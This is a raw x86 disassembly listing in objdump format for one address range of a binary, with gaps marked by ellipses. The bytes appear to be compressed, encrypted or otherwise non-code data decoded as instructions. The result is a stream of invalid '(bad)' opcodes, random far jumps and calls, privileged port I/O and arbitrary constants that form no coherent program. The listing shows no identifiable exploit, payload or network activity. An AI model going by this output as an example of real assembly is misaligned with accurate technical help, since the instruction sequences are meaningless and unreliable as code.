  421c74:	xor    esi,DWORD PTR [edi+eiz*8+0xbe3110f]
  421c7b:	and    al,BYTE PTR ds:0xe723278d
  421c81:	fstp   st(0)
  421c83:	cmp    cl,bl
  421c85:	mov    edx,0x2e85fa2e
  421c8a:	(bad)  
  421c8b:	jns    0x421c6d
  421c8d:	imul   ebx,DWORD PTR [ebx+ebx*4],0xae2f7b2a
  421c94:	out    0x45,eax
  421c96:	repz mov edx,DWORD PTR [edi-0x6e60e138]
  421c9d:	mov    dl,0xd1
  421c9f:	mov    dl,0x9e
  421ca1:	push   esp
  421ca2:	pop    edi
  421ca3:	out    dx,eax
  421ca4:	retf   
  421ca5:	mov    ecx,0x8803b506
  421caa:	xchg   edx,eax
  421cab:	adc    al,0xf3
  421cad:	fcom   DWORD PTR [edx]
  421caf:	xchg   edx,eax
  421cb0:	jecxz  0x421cd6
  421cb2:	addr16 data16 stc 
  421cb5:	mov    esi,0xe82ee7a0
  421cba:	int3   
  421cbb:	push   0x348ff6c
  421cc0:	popf   
  421cc1:	push   eax
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	pop    ss
  421d41:	inc    eax
  421d42:	sub    esi,DWORD PTR [eax+ebp*1-0x9fffe96]
  421d49:	add    BYTE PTR [eax],al
  421d4b:	add    BYTE PTR [ebx-0x3c],dh
  421d4e:	das    
  421d4f:	mov    bl,dl
  421d51:	mov    edi,0x2a9cf94c
  421d56:	mov    al,ds:0x3a2ff6b5
  421d5b:	push   0x6
  421d5d:	or     BYTE PTR [ebx+0x1ddf7417],0x47
  421d64:	pusha  
  421d65:	div    BYTE PTR [edi+0x3b]
  421d68:	fwait
  421d69:	mov    esp,DWORD PTR [eax]
  421d6b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  421d6d:	jg     0x421dcf
  421d6f:	mov    ds:0x9b1781ad,al
  421d74:	cs int3 
  421d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d77:	arpl   WORD PTR [esi+0x30],sp
  421d7a:	sbb    eax,esp
  421d7c:	fs das 
  421d7e:	out    0xe0,al
  421d80:	push   eax
  421d81:	fldenv [eax+0x73]
  421d84:	adc    al,0x24
  421d86:	in     eax,0xc2
  421d88:	jl     0x421df2
  421d8a:	mov    dh,0xf0
  421d8c:	popa   
  421d8d:	pop    ds
  421d8e:	test   BYTE PTR [esi+0x11d0a288],ch
  421d94:	ret    0xa09d
  421d97:	xchg   edi,eax
  421d98:	jmp    0x421d9c
  421d9a:	push   edi
  421d9b:	sbb    eax,0x5a0d113c
  421da0:	ficomp WORD PTR [ebx+0xe]
  421da3:	add    eax,DWORD PTR [eax+0x5273a989]
  421da9:	push   cs
  421daa:	cmc    
  421dab:	rcr    DWORD PTR [edx+0xe],cl
  421dae:	pop    ss
  421daf:	in     al,dx
  421db0:	aaa    
  421db1:	mov    cl,0xc5
  421db3:	xchg   esp,eax
  421db4:	and    esp,edi
  421db6:	aad    0x8f
  421db8:	inc    ebp
  421db9:	xchg   ecx,edx
  421dbb:	pop    ss
  421dbc:	fnstcw WORD PTR [edx+0x2a]
  421dbf:	jl     0x421db5
  421dc1:	lock out dx,al
  421dc3:	add    DWORD PTR [edi],ebx
  421dc5:	ins    DWORD PTR es:[edi],dx
  421dc6:	mov    ah,0xed
  421dc8:	xchg   esp,eax
  421dc9:	sub    BYTE PTR [esi],bl
  421dcb:	mov    ebx,0xeac8c60e
  421dd0:	jecxz  0x421ddd
  421dd2:	shr    BYTE PTR [edx],cl
  421dd4:	or     DWORD PTR [ecx],esi
  421dd6:	and    DWORD PTR [eax+0x4e3b189b],esi
  421ddc:	mov    ecx,0x6bf7b179
  421de1:	push   ebx
  421de2:	enter  0x27d0,0x3a
  421de6:	imul   esi,DWORD PTR [ebx+edx*8+0x4e5358b6],0x360449bd
  421df1:	and    ecx,DWORD PTR [edx]
  421df3:	jno    0x421de4
  421df5:	and    BYTE PTR [ebx],ch
  421df7:	pop    DWORD PTR [edi]
  421df9:	cmp    ebx,edx
  421dfb:	or     ebx,DWORD PTR [ebx+edi*4]
  421dfe:	push   edx
  421dff:	and    eax,0xa8b979f1
  421e04:	iret   
  421e05:	shr    ah,0xf0
  421e08:	mov    ds:0x76763bc5,eax
  421e0d:	xchg   edx,eax
  421e0e:	popa   
  421e0f:	xor    esp,DWORD PTR [ecx-0xab2d377]
  421e15:	mov    eax,0x8ef94f12
  421e1a:	aam    0x93
  421e1c:	ds jg  0x421e33
  421e1f:	jbe    0x421dc6
  421e21:	xchg   ebx,eax
  421e22:	add    BYTE PTR [edi],bl
  421e24:	xchg   ecx,eax
  421e25:	les    ebx,FWORD PTR [edi+0x54]
  421e28:	inc    edi
  421e29:	aam    0x16
  421e2b:	pop    ss
  421e2c:	inc    ecx
  421e2d:	and    ch,dh
  421e2f:	sahf   
  421e30:	xchg   edi,eax
  421e31:	jge    0x421e87
  421e33:	cld    
  421e34:	stos   DWORD PTR es:[edi],eax
  421e35:	lea    ecx,[edx-0xa]
  421e38:	and    BYTE PTR [edx],dl
  421e3a:	xchg   esp,edx
  421e3c:	or     al,0xc
  421e3e:	aam    0x95
  421e40:	lock sub al,BYTE PTR [eax]
	...
  421eb3:	add    BYTE PTR [eax],ah
  421eb5:	xchg   edi,eax
  421eb6:	inc    edx
  421eb7:	shl    edi,cl
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421eb4
  421ec1:	ror    BYTE PTR [ecx+0x66],cl
  421ec4:	push   ds
  421ec5:	imul   eax,DWORD PTR [ecx],0x0
  421ec8:	test   BYTE PTR [eax],0x0
  421ecb:	add    BYTE PTR [edi-0x3a],ah
  421ece:	(bad)  
  421ecf:	jl     0x421e70
  421ed1:	xor    eax,DWORD PTR [esi-0x7a]
  421ed4:	inc    edx
  421ed5:	std    
  421ed6:	out    0xde,al
  421ed8:	mov    esi,0xfe32264
  421edd:	ror    BYTE PTR [edx+0xa9ad97a],cl
  421ee3:	loope  0x421f4c
  421ee5:	xchg   ecx,eax
  421ee6:	mov    edi,DWORD PTR ss:[edi+0x5897b1]
  421eed:	or     al,al
  421eef:	sbb    eax,0x3b1ce16c
  421ef4:	imul   esi,DWORD PTR [edx],0x3b99abbf
  421efa:	enter  0x4726,0x47
  421efe:	lock inc ecx
  421f00:	shr    ebx,1
  421f02:	jmp    0x578d96f1
  421f07:	cmp    DWORD PTR [ebx+0x37],0xda5fb5d4
  421f0e:	lods   eax,DWORD PTR ds:[esi]
  421f0f:	shl    DWORD PTR [ecx+0x9],1
  421f12:	in     al,0x95
  421f14:	jmp    0x8fbd:0x1b9f6f80
  421f1b:	pop    es
  421f1c:	or     ebp,ecx
  421f1e:	xchg   ebx,eax
  421f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f21:	jecxz  0x421ef7
  421f23:	cmc    
  421f24:	jnp    0x421eed
  421f26:	xchg   edx,eax
  421f27:	pop    esp
  421f28:	aad    0x8
  421f2a:	add    eax,0x8b0ba1cd
  421f2f:	fldenv [ecx+0x48502cd8]
  421f35:	icebp  
  421f36:	mov    al,0x89
  421f38:	sbb    BYTE PTR [edi+edi*4],dl
  421f3b:	pusha  
  421f3c:	cwde   
  421f3d:	xor    al,0x1e
  421f3f:	mov    edi,0xd24c77b8
  421f44:	stc    
  421f45:	inc    eax
  421f46:	ret    
  421f47:	cwde   
  421f48:	repnz sar bh,cl
  421f4b:	je     0x421f40
  421f4d:	shl    BYTE PTR [edx+ebp*2-0x61314cad],0x66
  421f55:	call   0x6e8f:0x80058b1b
  421f5c:	fld    TBYTE PTR [ecx-0x1e]
  421f5f:	sahf   
  421f60:	pop    esp
  421f61:	xor    DWORD PTR [eax+0x73],ebp
  421f64:	ins    BYTE PTR es:[edi],dx
  421f65:	push   edx
  421f66:	mov    ch,0x39
  421f68:	xchg   DWORD PTR [ecx+0x4],ebx
  421f6b:	loopne 0x421fad
  421f6d:	xchg   esi,eax
  421f6e:	out    0x83,eax
  421f70:	test   eax,0xc17a0f9e
  421f75:	mov    edx,DWORD PTR [edi+eax*1]
  421f78:	xchg   ebp,eax
  421f79:	add    BYTE PTR [edx],0x50
  421f7c:	add    al,0xe4
  421f7e:	out    0x36,eax
  421f80:	arpl   WORD PTR [edx+0x264d7943],bp
  421f86:	add    al,0xc8
  421f88:	lea    edx,[ecx]
  421f8a:	arpl   WORD PTR [ebp+0x3ad915b8],bp
  421f90:	loopne 0x421f7a
  421f92:	sbb    DWORD PTR [edi+eiz*2+0x54535806],esi
  421f99:	in     al,dx
  421f9a:	fstp   QWORD PTR [ecx]
  421f9c:	cs leave 
  421f9e:	pop    ss
  421f9f:	fldcw  WORD PTR [edi]
  421fa1:	or     DWORD PTR [ecx+0x5a11a724],esi
  421fa7:	lds    ebp,FWORD PTR ds:0x99c22fbe
  421fad:	lea    ecx,[esi+0x139d3a4a]
  421fb3:	lds    ebp,FWORD PTR [esi+esi*1]
  421fb6:	retf   0x91a3
  421fb9:	lock add DWORD PTR [ebp+0x5bd67cb7],0x72
  421fc1:	dec    edi
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x1123c81b
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    bl,dl
  42204d:	jecxz  0x42200b
  42204f:	setne  BYTE PTR [esi]
  422052:	mov    edi,0x39143ca5
  422057:	push   edi
  422058:	xor    al,0x14
  42205a:	popf   
  42205b:	cmp    cl,BYTE PTR [ebp+0x66db2a09]
  422061:	jns    0x422065
  422063:	(bad)  
  422064:	rcr    BYTE PTR [edx],cl
  422066:	xor    eax,0x57938eb5
  42206b:	jl     0x422003
  42206d:	fisub  DWORD PTR [eax]
  42206f:	(bad)  [ecx+0x45fd7296]
  422075:	or     DWORD PTR [edi],0xffffffb3
  422078:	xor    al,0xd1
  42207a:	retf   0x6e35
  42207d:	hlt    
  42207e:	mov    ds:0x9b8c2ae0,al
  422083:	adc    eax,0x4750c217
  422088:	push   eax
  422089:	inc    edi
  42208a:	jecxz  0x422020
  42208c:	jmp    0x7842924c
  422091:	or     edx,edx
  422093:	sub    esp,eax
  422095:	pop    ebp
  422096:	mov    edx,0xe12018cb
  42209b:	cmc    
  42209c:	dec    edi
  42209d:	les    ebx,FWORD PTR [edx+0x35ec5350]
  4220a3:	or     al,0xf3
  4220a5:	fcmove st,st(6)
  4220a7:	xor    cl,bl
  4220a9:	sbb    BYTE PTR [eax+esi*1-0xd],dh
  4220ad:	push   eax
  4220ae:	outs   dx,BYTE PTR ds:[esi]
  4220af:	ror    dl,cl
  4220b1:	je     0x422059
  4220b3:	test   al,0xc6
  4220b5:	pop    esi
  4220b6:	sahf   
  4220b7:	fimul  WORD PTR [edx]
  4220b9:	sub    al,0xf3
  4220bb:	jns    0x4220c2
  4220bd:	inc    esp
  4220be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220bf:	dec    ecx
  4220c0:	int    0xda
  4220c2:	jbe    0x42211d
  4220c4:	push   cs
  4220c5:	fadd   st(4),st
  4220c7:	dec    eax
  4220c8:	xor    eax,0x22ef1413
  4220cd:	(bad)  
  4220ce:	clc    
  4220cf:	ss mov cl,0x8
  4220d2:	fs push ss
  4220d4:	jbe    0x4220e2
  4220d6:	xchg   BYTE PTR [ebp-0x45c477b6],bh
  4220dc:	adc    al,0x27
  4220de:	fmul   QWORD PTR [ecx]
  4220e0:	leave  
  4220e1:	xor    eax,0x2abbca63
  4220e6:	fucomip st,st(6)
  4220e8:	dec    esp
  4220e9:	test   BYTE PTR [edx-0x1c1fc4b8],0x2e
  4220f0:	mov    eax,ds:0xa9db6fa0
  4220f5:	jbe    0x4220b1
  4220f7:	or     eax,0x15d41c7d
  4220fc:	push   edi
  4220fd:	mov    BYTE PTR [ebp-0x79017b15],dh
  422103:	in     eax,dx
  422104:	xchg   ecx,eax
  422105:	add    eax,0x33e840bf
  42210a:	xchg   ecx,eax
  42210b:	(bad)  
  42210c:	xor    bh,BYTE PTR [eax-0x621f23cb]
  422112:	sub    dl,cl
  422114:	into   
  422115:	aam    0xcf
  422117:	iret   
  422118:	sub    dh,BYTE PTR [ebx]
  42211a:	xchg   DWORD PTR [edx],eax
  42211c:	xchg   BYTE PTR [edx+0x56],ah
  42211f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422120:	and    ah,bh
  422122:	scas   al,BYTE PTR es:[edi]
  422123:	fcom   QWORD PTR [eax+edx*2]
  422126:	hlt    
  422127:	adc    DWORD PTR [ebp+edi*4+0x2],ebx
  42212b:	(bad)  
  42212d:	mov    edi,0x77c446ff
  422132:	push   esp
  422133:	ins    DWORD PTR es:[edi],dx
  422134:	je     0x422167
  422136:	(bad)
  422139:	(bad)  
  42213a:	outs   dx,DWORD PTR ds:[esi]
  42213b:	mov    bh,0xbe
  42213d:	xor    eax,0xc27384f3
	...
  4221b2:	add    BYTE PTR [eax],al
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0xdad52766
  4221c1:	cmp    eax,0x6d0a9908
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	test   BYTE PTR [eax],0x0
  4221cb:	add    BYTE PTR [edi-0xa3269d],al
  4221d1:	mov    dl,BYTE PTR [esp+eax*8+0x5e8e1d81]
  4221d8:	adc    BYTE PTR [ecx-0x1],bh
  4221db:	mov    dl,0x9a
  4221dd:	inc    BYTE PTR [edi+0x56]
  4221e0:	icebp  
  4221e1:	into   
  4221e2:	and    BYTE PTR [edx],ch
  4221e4:	pop    esp
  4221e5:	out    0x69,eax
  4221e7:	test   al,0x28
  4221e9:	push   ecx
  4221ea:	inc    ecx
  4221eb:	push   es
  4221ec:	mov    dl,0x7a
  4221ee:	jmp    0xc063:0x7d8b97c2
  4221f5:	add    dh,BYTE PTR [ecx+0x2b]
  4221f8:	inc    eax
  4221f9:	cmp    BYTE PTR [eax+edx*8-0x56],ch
  4221fd:	icebp  
  4221fe:	lods   eax,DWORD PTR ds:[esi]
  4221ff:	cmc    
  422200:	or     ch,dl
  422202:	lods   al,BYTE PTR ss:[esi]
  422204:	ds cwde 
  422206:	jnp    0x4221cd
  422208:	sbb    ah,BYTE PTR [ebp+0x760de94c]
  42220e:	mov    cl,0xb4
  422210:	cmp    esi,edx
  422212:	jo     0x422268
  422214:	sbb    eax,0xdbdb6185
  422219:	(bad)  
  42221a:	sti    
  42221b:	push   cs
  42221c:	(bad)  
  42221d:	mov    WORD PTR [ebx+ecx*4-0x22],fs
  422221:	(bad)  
  422222:	ds popf 
  422224:	lods   eax,DWORD PTR ds:[esi]
  422225:	pop    edx
  422226:	cdq    
  422227:	push   ebx
  422228:	not    dl
  42222a:	pop    ss
  42222b:	pop    es
  42222c:	pop    ebx
  42222d:	pop    esi
  42222e:	std    
  42222f:	mov    ecx,0xb96dd676
  422234:	xor    dh,bl
  422236:	data16 fbstp TBYTE PTR ds:0x2972ba5d
  42223d:	dec    esi
  42223e:	sub    eax,0xf3eb9e31
  422243:	and    al,0x81
  422245:	clc    
  422246:	mov    ebp,0xf1722ad3
  42224b:	(bad)  
  42224c:	(bad)  
  42224d:	aam    0xe7
  42224f:	jmp    0xdb3d:0x4e9d780b
  422256:	outs   dx,DWORD PTR ds:[esi]
  422257:	arpl   WORD PTR [esi-0x71],bp
  42225a:	and    esi,DWORD PTR [edi-0x4145a801]
  422260:	adc    dl,BYTE PTR [ebx]
  422262:	jp     0x4222af
  422264:	mov    al,ds:0x4ed3742f
  422269:	stos   BYTE PTR es:[edi],al
  42226a:	xchg   esp,eax
  42226b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42226c:	lea    ebp,[ecx]
  42226e:	sub    DWORD PTR [ebx-0x5a],ecx
  422271:	xor    bl,BYTE PTR [edi+0x69a52fe9]
  422277:	jp     0x4222e5
  422279:	stc    
  42227a:	js     0x422297
  42227c:	fsub   DWORD PTR [edi+0x6e646a85]
  422282:	jmp    0xa8a5bbdf
  422287:	add    cl,BYTE PTR [ebx+ebp*2-0xceaf4fd]
  42228e:	dec    ecx
  42228f:	mov    cl,0x5e
  422291:	mov    ebx,DWORD PTR [edi]
  422293:	mov    ebp,ebp
  422295:	adc    BYTE PTR [eax-0x5b59105a],0xe4
  42229c:	int3   
  42229d:	imul   eax,DWORD PTR [ebx-0x519b22b1],0x4f
  4222a4:	jp     0x4222d3
  4222a6:	in     al,0x56
  4222a8:	data16 adc BYTE PTR [eax+0x284fbb2c],bh
  4222af:	data16 loope 0x4222b7
  4222b2:	hlt    
  4222b3:	adc    al,0x67
  4222b5:	sbb    BYTE PTR [edi],ch
  4222b7:	shl    BYTE PTR [edi+0x25],0x65
  4222bb:	ss adc eax,0x135279e2
  4222c1:	into   
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	or     DWORD PTR gs:[ecx-0x6e],edi
  422344:	add    BYTE PTR [esi+0x1],ch
  422347:	add    dh,dh
  422349:	add    BYTE PTR [eax],al
  42234b:	add    ch,al
  42234d:	xor    DWORD PTR [ebp-0x14890a5e],eax
  422353:	push   edx
  422354:	fwait
  422355:	sti    
  422356:	dec    edx
  422357:	in     eax,dx
  422358:	mov    ecx,ebp
  42235a:	mov    ah,0x80
  42235c:	call   0xfefe:0xa7fb4c3a
  422363:	jecxz  0x422371
  422365:	in     eax,dx
  422366:	cmp    dl,bl
  422368:	xor    al,0x79
  42236a:	mov    dl,0x78
  42236c:	inc    edx
  42236d:	adc    DWORD PTR [esi+ebp*4+0x2f],0x76bc2da
  422375:	fldenv [ecx+0x348c80cd]
  42237b:	pop    ecx
  42237c:	call   0x3526:0x6c43ff25
  422383:	xlat   BYTE PTR ds:[ebx]
  422384:	push   cs
  422385:	popa   
  422386:	mov    esi,0xf4d5a24
  42238b:	push   edx
  42238c:	push   0x1b894ae3
  422391:	mov    eax,0x7c9dcfc6
  422396:	pushf  
  422397:	fiadd  WORD PTR [eax]
  422399:	sbb    BYTE PTR [esi],cl
  42239b:	pop    edi
  42239c:	ret    0x9068
  42239f:	data16 adc BYTE PTR [esi-0xc],ah
  4223a3:	push   cs
  4223a4:	xchg   esi,eax
  4223a5:	mov    esp,0x39fb7248
  4223aa:	loop   0x422385
  4223ac:	dec    edx
  4223ad:	(bad)  
  4223af:	test   al,0xf5
  4223b1:	std    
  4223b2:	sub    bl,BYTE PTR [ecx+ebp*8+0x62]
  4223b6:	test   ch,ch
  4223b8:	and    esi,DWORD PTR [ebp+0x2]
  4223bb:	das    
  4223bc:	inc    eax
  4223bd:	cs xchg esp,eax
  4223bf:	jmp    0x98bfdd00
  4223c4:	cmp    al,0x2d
  4223c6:	sbb    eax,0xf2caef1c
  4223cb:	fistp  QWORD PTR [esi-0x5ae2f6e7]
  4223d1:	sbb    al,0xe3
  4223d3:	inc    ecx
  4223d4:	outs   dx,DWORD PTR ds:[esi]
  4223d5:	xor    DWORD PTR [ebx-0x79489f2b],ecx
  4223db:	sub    al,0x7d
  4223dd:	cmp    cl,BYTE PTR [ecx+0x26944d84]
  4223e3:	xor    edi,DWORD PTR [esi-0x25]
  4223e6:	mov    ah,BYTE PTR [esi+edi*8]
  4223e9:	(bad)  
  4223ea:	mov    ecx,0x78141998
  4223ef:	adc    DWORD PTR [esi-0x6b],edi
  4223f2:	xor    al,0xbb
  4223f4:	pop    edx
  4223f5:	inc    eax
  4223f6:	add    DWORD PTR [esi-0x612ecafc],0xffffff86
  4223fd:	test   DWORD PTR [ebp+0x7e],ebx
  422400:	mov    ebp,0xf02f2d8e
  422405:	ins    DWORD PTR es:[edi],dx
  422406:	cmc    
  422407:	xor    al,0x1a
  422409:	push   esi
  42240a:	pop    ss
  42240b:	inc    edi
  42240c:	mov    DWORD PTR [ecx+0x4b],esi
  42240f:	xor    al,0x26
  422411:	and    DWORD PTR [edi-0x60557466],eax
  422417:	inc    ebx
  422418:	xchg   ebx,eax
  422419:	ret    
  42241a:	jp     0x4223db
  42241c:	add    edx,ebx
  42241e:	sbb    DWORD PTR [edi+0x64],0x3f110297
  422425:	fwait
  422426:	jg     0x4224a1
  422428:	add    ecx,DWORD PTR [eax+eax*4-0x2e1853e9]
  42242f:	inc    ecx
  422430:	xlat   BYTE PTR ds:[ebx]
  422431:	ja     0x42242d
  422433:	hlt    
  422434:	cmp    al,0x39
  422436:	mov    bl,0xb2
  422438:	add    al,0x25
  42243a:	mov    dh,dl
  42243c:	fwait
  42243d:	sub    al,0x93
  42243f:	mov    dh,0x6d
  422441:	xor    eax,DWORD PTR [eax]
	...
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x6b919f7c
  4224c2:	mov    al,BYTE PTR [eax]
  4224c4:	imul   BYTE PTR [esi+0x1]
  4224c7:	add    dh,dh
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [edi-0xb],bh
  4224ce:	clc    
  4224cf:	mov    bl,0x53
  4224d1:	sub    BYTE PTR [ebx+0x1e4ebc8e],ch
  4224d7:	popf   
  4224d8:	cdq    
  4224d9:	sar    DWORD PTR es:0x786c406f,0xc0
  4224e1:	mov    ecx,0xde74dc67
  4224e6:	mov    dl,0xb9
  4224e8:	push   edx
  4224e9:	inc    esp
  4224ea:	mov    edx,0x267b1378
  4224ef:	in     al,dx
  4224f0:	enter  0xf64f,0xcd
  4224f4:	sbb    bl,al
  4224f6:	loope  0x4224ec
  4224f8:	jge    0x422566
  4224fa:	jbe    0x4224e6
  4224fc:	gs inc ebx
  4224fe:	inc    esi
  4224ff:	in     eax,dx
  422500:	add    eax,0x51d1ac8b
  422505:	mov    ebp,0x2d5effdb
  42250a:	ss dec esi
  42250c:	mov    edi,0xdcac791a
  422511:	adc    al,0x29
  422513:	and    eax,0xc7b58b18
  422518:	pushf  
  422519:	inc    ecx
  42251a:	jmp    0x422578
  42251c:	sub    DWORD PTR [edx+eax*8-0x52a9d07a],ebx
  422523:	push   si
  422525:	sub    al,0x80
  422527:	inc    eax
  422528:	(bad)  
  422529:	fst    DWORD PTR [ecx+0xe]
  42252c:	shr    DWORD PTR [esi-0x7a81892a],0x96
  422533:	jl     0x4224ca
  422535:	pop    ss
  422536:	add    ecx,DWORD PTR [edi+0x3eff374]
  42253c:	pop    eax
  42253d:	jne    0x422557
  42253f:	dec    esi
  422540:	lea    edi,[edi+eax*2-0x58]
  422544:	popa   
  422545:	xchg   DWORD PTR [ebx+esi*2+0x307aae25],ecx
  42254c:	push   es
  42254d:	and    eax,0x76603c12
  422552:	mov    esi,0x5668bea4
  422557:	pusha  
  422558:	out    0xaa,eax
  42255a:	lahf   
  42255b:	(bad)  [ecx+0x45]
  42255e:	xchg   edi,eax
  42255f:	jge    0x4224fa
  422561:	and    DWORD PTR [edx-0x41a1e9bd],eax
  422567:	pop    ebp
  422568:	(bad)  [ebx]
  42256a:	or     al,0x5d
  42256c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256e:	pusha  
  42256f:	xor    edi,DWORD PTR [ebx]
  422571:	xor    ecx,DWORD PTR [eax]
  422573:	sbb    eax,DWORD PTR cs:[edi+ebp*1-0x58]
  422578:	mov    ebx,0x3e7f6850
  42257d:	ret    0xaf32
  422580:	fdivp  st(7),st
  422582:	hlt    
  422583:	ins    BYTE PTR es:[edi],dx
  422584:	mov    ah,0xc2
  422586:	fisttp WORD PTR [edx-0x28]
  422589:	stos   DWORD PTR es:[edi],eax
  42258a:	stos   DWORD PTR es:[edi],eax
  42258b:	and    al,0x5
  42258d:	and    BYTE PTR ds:0x894dfd03,bh
  422593:	in     eax,dx
  422594:	push   0x3b
  422596:	jo     0x4225f4
  422598:	add    cl,0x52
  42259b:	loope  0x422613
  42259d:	out    dx,eax
  42259e:	retf   0x6103
  4225a1:	mov    BYTE PTR [ecx+0x6c39def2],ch
  4225a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225a8:	jo     0x42260f
  4225aa:	outs   dx,DWORD PTR ds:[esi]
  4225ab:	mov    DWORD PTR [ecx-0x8],0x83faab09
  4225b2:	outs   dx,DWORD PTR ds:[esi]
  4225b3:	std    
  4225b4:	xor    eax,esi
  4225b6:	add    DWORD PTR [eax-0x57],0xffffff8a
  4225ba:	jno    0x42257d
  4225bc:	shl    DWORD PTR [ecx+0x4cbf0cd4],cl
	...
  422632:	add    BYTE PTR [eax],al
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	inc    esp
  422641:	das    
  422642:	xchg   BYTE PTR [ebx+0x16fec],ch
  422648:	test   BYTE PTR [eax],0x0
  42264b:	add    BYTE PTR [ecx+0x67d9975f],ch
  422651:	sub    eax,0xa6e1bcb3
  422656:	push   es
  422657:	in     al,dx
  422658:	ds pop es
  42265a:	and    ah,BYTE PTR [ebp+0x6ba7f2d]
  422660:	dec    ecx
  422661:	mov    eax,0xccff8d03
  422666:	hlt    
  422667:	popa   
  422668:	mov    ds:0x92bead1a,al
  42266d:	fidiv  DWORD PTR [ebx]
  42266f:	xor    eax,0x561e4b18
  422674:	int    0x7e
  422676:	adc    bl,0x54
  422679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267a:	ss mov cl,0xe1
  42267d:	iret   
  42267e:	push   ebx
  42267f:	into   
  422680:	push   edi
  422681:	mov    ecx,0xbffaad4f
  422686:	xchg   esp,ebp
  422688:	jl     0x4226ed
  42268a:	pop    ebp
  42268b:	and    eax,0xf111d56b
  422690:	xchg   DWORD PTR [edi-0x573a9261],edx
  422696:	mov    al,ds:0x34cd05fb
  42269b:	sub    ebp,DWORD PTR [edx-0x49]
  42269e:	retf   
  42269f:	adc    DWORD PTR [ebx-0x497d7585],0x9daa4270
  4226a9:	xchg   ebx,eax
  4226aa:	stos   BYTE PTR es:[edi],al
  4226ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ac:	in     al,0x56
  4226ae:	inc    ebx
  4226af:	iret   
  4226b0:	jge    0x4226d9
  4226b2:	adc    DWORD PTR [ebp+0x33],0x41
  4226b6:	and    cl,ah
  4226b8:	push   ss
  4226b9:	push   eax
  4226ba:	adc    eax,0xc5f19b86
  4226bf:	and    BYTE PTR [edi+0x9],ah
  4226c2:	jl     0x4226e7
  4226c4:	sti    
  4226c5:	cli    
  4226c6:	es pop ebp
  4226c8:	rol    BYTE PTR [ebx],0x1d
  4226cb:	fcmovu st,st(7)
  4226cd:	sahf   
  4226ce:	stos   BYTE PTR es:[edi],al
  4226cf:	sbb    BYTE PTR [esi-0x9],cl
  4226d2:	cmp    al,0x19
  4226d4:	fmul   QWORD PTR [eax]
  4226d6:	jno    0x422666
  4226d8:	sub    dl,0xb
  4226db:	pop    ss
  4226dc:	jmp    0xd56e:0xa6d4bb51
  4226e3:	xlat   BYTE PTR ds:[ebx]
  4226e4:	test   eax,0xaf59463b
  4226e9:	scas   eax,DWORD PTR es:[edi]
  4226ea:	es dec ebp
  4226ec:	sub    al,0xfd
  4226ee:	(bad)  
  4226ef:	test   esp,0xd9a5aeac
  4226f5:	fwait
  4226f6:	out    0xed,eax
  4226f8:	pop    ds
  4226f9:	icebp  
  4226fa:	add    eax,0x898e1ca3
  4226ff:	mov    ds:0xa1b7d717,al
  422704:	cld    
  422705:	push   es
  422706:	pop    esp
  422707:	bound  ebp,QWORD PTR [ebx-0x291f5325]
  42270d:	add    edx,ebp
  42270f:	cmp    BYTE PTR [ebx],ah
  422711:	and    edx,esp
  422713:	cli    
  422714:	dec    ebx
  422715:	ins    BYTE PTR es:[edi],dx
  422716:	lods   eax,DWORD PTR ds:[esi]
  422717:	sbb    al,0xf5
  422719:	adc    al,0xe7
  42271b:	daa    
  42271c:	lods   eax,DWORD PTR ds:[esi]
  42271d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42271e:	fs jmp 0x6edc:0xcc21f9e7
  422726:	stos   DWORD PTR es:[edi],eax
  422727:	mov    ds,edi
  422729:	add    al,dh
  42272b:	cmp    cl,BYTE PTR [ebx+0x6df44a7]
  422731:	mov    esi,ebx
  422733:	rcr    edx,0x57
  422736:	sub    cl,BYTE PTR [ebp-0x6f99f691]
  42273c:	lea    edi,[esi-0x32]
  42273f:	mov    esp,0x9126
	...
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	mov    ecx,0xe2626bfb
  4227c5:	jo     0x4227c8
  4227c7:	add    dh,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR ds:0x5e4d6883,al
  4227d1:	pop    esi
  4227d2:	pop    ebp
  4227d3:	push   0xffffffc6
